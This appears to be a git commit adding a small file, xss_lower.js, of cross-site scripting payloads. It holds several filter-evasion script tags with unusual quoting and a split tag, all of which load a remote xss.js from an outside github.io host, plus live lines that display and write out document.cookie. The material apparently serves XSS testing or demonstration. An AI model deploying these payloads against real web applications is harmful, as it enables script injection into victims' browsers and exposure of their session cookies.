f1b80dfb84f3daec9928a9b65e6c48a7c487f7da
Matt Abhay <matt.abhay@vibes.com>
2014-05-27 14:08:34 -0500

    lower case and upper case versions

---
+++ xss_lower.js
@@ -0,0 +1,9 @@
+//<SCRIPT "a='>'" SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+//<SCRIPT a=">" '' SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+//<SCRIPT =">" SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+//<SCRIPT a=">" SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+//<SCRIPT a=`>` SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+//<SCRIPT a=">'>" SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+//<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://saltnvinegar.github.io/external-xss-attack/xss.js"></SCRIPT>
+alert ("Bro, do you even XSS? " + document.cookie);
+document.write ("I'm in ur interwebz, attacking ur app " + document.cookie);
